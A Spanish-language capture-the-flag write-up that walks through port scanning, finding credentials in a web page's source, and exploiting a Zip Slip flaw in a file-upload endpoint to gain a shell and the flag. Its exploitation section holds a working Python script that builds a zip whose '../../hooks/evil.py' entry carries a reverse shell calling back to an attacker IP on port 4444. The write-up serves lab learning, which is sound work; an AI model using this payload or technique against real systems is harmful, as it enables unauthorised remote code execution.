---
layout: apunte
title: "2. Getting the Flags"
---

<h2>Reconocimiento Inicial</h2>
Comenzamos realizando un escaneo de puertos abiertos.

!**Pasted image 20260823205533.png**

Ahora vamos a escanear los puertos abiertos más en profundidad.

!**Pasted image 20260823205409.png**

Vamos a ver qué hay en la web.

!**Pasted image 20260823205643.png**

Vemos dos endpoints muy interesantes. Vamos a ver cómo se ve la web.

!**Pasted image 20260823205723.png**

-----------------------------------
<h2>Profundización</h2>
Si miramos el código fuente podemos encontrar usuario y contraseña.

!**Pasted image 20260823205812.png**

Vamos a probar con dicho par para intentar obtener acceso al endpoint `/upload`, que es el más jugoso aparentemente.

!**Pasted image 20260823205945.png**

Hemos entrado al panel donde aparece el endpoint de subida. Vamos a investigar si hay algún tipo de filtro. Si intentamos subir un archivo `.php` nos dice lo siguiente.

!**Pasted image 20260823210439.png**

Vamos a crear un archivo `.zip` de prueba para ver cómo funciona la subida.

!**Pasted image 20260823211427.png**

Ahora probamos a subirlo.

!**Pasted image 20260823211509.png**

El mensaje ha cambiado. Vamos a la dirección que nos han dado.

!**Pasted image 20260823211752.png**

Aquí está.

---------------------------------
<h2>Explotación</h2>
Sabemos que está guardando las shells en un directorio `/shells/shell-id/`. Por lo que podemos inferir que los hooks se están guardando de forma similar. Hay un tipo de ataque llamado `Zip Slip` que nos permite guardar un nombre con `../../` y estos serán interpretados al descomprimirse.

Vamos a crear un exploit en python que nos devuelva el archivo `.zip` listo para subir.

```python
import zipfile, json

payload = ('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[REDACTED]",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")')

with zipfile.ZipFile("evil.zip", "w") as z:
    z.writestr("shell.json", json.dumps({"name": "evil", "assets": ["style.css"]}))
    z.writestr("style.css", "/* test */")
    z.writestr("../../hooks/evil.py", payload)

```

Ahora lo ejecutamos. Y esto nos da el zip para subir. Nos ponemos en escucha:

!**Pasted image 20260823214848.png**

Y ahora subimos el archivo.

!**Pasted image 20260823214920.png**

Una vez que el worker llega a los hooks, podemos ver que nos devuelve una shell.

!**Pasted image 20260823214944.png**

Y una vez allí buscamos la flag.

!**Pasted image 20260823215133.png**
